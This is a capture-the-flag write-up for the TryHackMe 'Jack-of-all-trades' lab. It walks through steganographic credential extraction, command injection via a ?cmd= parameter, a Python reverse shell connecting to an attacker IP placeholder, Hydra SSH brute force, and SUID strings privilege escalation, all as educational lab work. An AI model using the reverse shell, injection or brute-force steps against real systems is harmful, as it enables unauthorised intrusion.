# 🃏 TryHackMe — Jack-of-all-trades

> **Difficulty:** Easy | **OS:** Linux | **Category:** Steganography / Web / Privilege Escalation
> **Author:** Aryan Barkhordar

---

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
  * [Port Scanning](#port-scanning)
  * [Web Enumeration](#web-enumeration)
- [Exploitation](#exploitation)
  * [Source Code Analysis — Hidden Page & Encoded Strings](#source-code-analysis--hidden-page--encoded-strings)
  * [Decoding the Hint — Base32 → Hex → ROT13](#decoding-the-hint--base32--hex--rot13)
  * [Steganography — Credential Extraction from Image](#steganography--credential-extraction-from-image)
  * [RCE via URL Parameter Injection](#rce-via-url-parameter-injection)
  * [Reverse Shell](#reverse-shell)
- [Post-Exploitation](#post-exploitation)
  * [Password List Discovery](#password-list-discovery)
  * [SSH Brute Force — Hydra](#ssh-brute-force--hydra)
  * [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
  * [SUID Binary Enumeration](#suid-binary-enumeration)
  * [Root Flag via `strings`](#root-flag-via-strings)
- [Flags](#flags)
- [Summary](#summary)

---

## Overview

**Jack-of-all-trades** is a TryHackMe machine with a deliberately inverted port configuration — HTTP runs on port 22 and SSH on port 80. The attack chain involves layered encoding challenges to extract credentials hidden within a steganographic image, followed by exploitation of a command injection vulnerability in a CMS recovery panel. Post-exploitation reveals a password list, which Hydra uses to brute-force SSH access. Privilege escalation abuses a SUID `strings` binary to read the root flag directly.

---

## Reconnaissance

### Port Scanning

An initial `nmap` scan revealed an unusual port configuration:

```
PORT   STATE SERVICE
22/tcp open  http
80/tcp open  ssh
```

> **Key Finding:** The services were intentionally swapped — HTTP was running on port `22` and SSH on port `80`. Navigating to `http://<TARGET>:22` served the website; SSH was accessible at `<TARGET>:80`.

---

### Web Enumeration

Browsing to `http://<TARGET>:22` presented a Jack-themed landing page. No obvious attack surface was visible from the page itself, prompting a closer inspection of the page source.

---

## Exploitation

### Source Code Analysis — Hidden Page & Encoded Strings

Inspecting the page source via browser DevTools revealed two items of interest:

- A reference to a hidden path: `/recovery.php`
- A **Base64-encoded string** embedded in an HTML comment

The Base64 string was decoded using CyberChef, revealing what appeared to be a password. However, this credential did not authenticate successfully on the `/recovery.php` login form.

---

### Decoding the Hint — Base32 → Hex → ROT13

The page source of `/recovery.php` contained a further encoded string. Decoding it required a multi-stage operation:

```
Base32 → Hex → ROT13
```

The final decoded output read:

> *"Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S"*

> **Key Observation:** The bit.ly link redirected to a Wikipedia article about a dinosaur species — a hint toward steganography being involved, and specifically towards one of the images on the homepage.

---

### Steganography — Credential Extraction from Image

Two images were present on the homepage: `stego.jpg` and `header.jpg`.

`stegseek` was attempted against `stego.jpg` first:

```
stegseek stego.jpg /usr/share/wordlists/rockyou.txt
```

The tool returned an embedded decoy message indicating the wrong image was targeted.

`steghide` was then used against `header.jpg` with the password extracted earlier from the Base64 decode:

```
steghide extract -sf header.jpg
```

This successfully extracted a file named `cms.creds`, containing the valid credentials for `/recovery.php`.

---

### RCE via URL Parameter Injection

After authenticating to `/recovery.php`, the panel displayed the following message:

> *"GET me a 'cmd' and I'll run it for you Future-Jack."*

This explicitly indicated a `GET` parameter named `cmd` was being passed directly to system execution. Testing confirmed arbitrary command injection:

```
http://<TARGET>:22/recovery.php?cmd=ls
```

A directory listing was returned — Remote Code Execution was confirmed.

---

### Reverse Shell

A Python reverse shell payload was executed via the `cmd` parameter:

```
export RHOST="<ATTACKER IP>";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

With a Netcat listener running on port 4444, the shell connected successfully, providing an interactive session on the target.

---

## Post-Exploitation

### Password List Discovery

Exploring `/home` revealed a file named `jacks_password_list` — a plaintext list of potential SSH passwords for the user `jack`.

The file was exfiltrated to the attacker machine for offline use.

---

### SSH Brute Force — Hydra

`Hydra` was used to brute-force SSH on port 80 using the recovered password list:

```
hydra -l jack -P jacks_password_list ssh://<TARGET> -s 80
```

Hydra identified the valid password. SSH access was established as `jack`.

---

### User Flag

Jack's home directory contained a file named `user.jpg`. The file was transferred back to the attacker machine via `scp`:

```
scp -P 80 jack@<TARGET>:~/user.jpg .
```

Opening the image revealed the **user flag** embedded visually within it.

---

## Privilege Escalation

### SUID Binary Enumeration

With a shell as `jack`, standard privilege escalation checks were run:

```
sudo -l
```

Jack had no sudo permissions. A search for SUID binaries followed:

```
find / -type f -user root -perm -u=s 2>/dev/null
```

The output included:

```
/usr/bin/strings
```

> **Key Observation:** The `strings` binary was configured with the SUID bit set, meaning it executes with root-level permissions regardless of the calling user. Since `strings` can read arbitrary file contents, it can be used to access any file on the system as root.

---

### Root Flag via `strings`

The root flag was read directly using the SUID `strings` binary:

```
strings /root/root.txt
```

The flag was printed to stdout, completing the machine.

---

## Flags

| Flag        | Value           |
| ----------- | --------------- |
| 🏳️ **User** | `THM{REDACTED}` |
| 🚩 **Root**  | `THM{REDACTED}` |

---

## Summary

| Stage                    | Technique                                                                         |
| ------------------------ | --------------------------------------------------------------------------------- |
| **Recon**                | `nmap` scan, inverted port discovery (HTTP:22, SSH:80)                            |
| **OSINT**                | Source code inspection, multi-layer encoding (Base64, Base32, Hex, ROT13)         |
| **Steganography**        | `steghide` extracts `cms.creds` from `header.jpg`                                 |
| **Initial Access**       | RCE via `?cmd=` GET parameter injection on `/recovery.php`                        |
| **Lateral Movement**     | `jacks_password_list` → Hydra SSH brute force → shell as `jack`                  |
| **Privilege Escalation** | SUID `/usr/bin/strings` → root file read                                          |

---

*Writeup by Aryan Barkhordar*
